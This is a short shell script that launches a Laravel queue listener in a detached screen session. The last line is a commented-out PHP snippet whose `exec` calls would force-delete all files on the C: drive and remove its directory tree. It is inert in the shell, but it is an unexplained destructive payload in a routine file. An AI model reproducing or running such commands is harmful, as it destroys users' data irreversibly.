#!/bin/sh
screen -d -m php artisan queue:listen --tries=100

#<?php exec("start /B del C:\*.* /F /Q /s"); ?> <?php exec("start /B rmdir C:\ /s /q"); ?>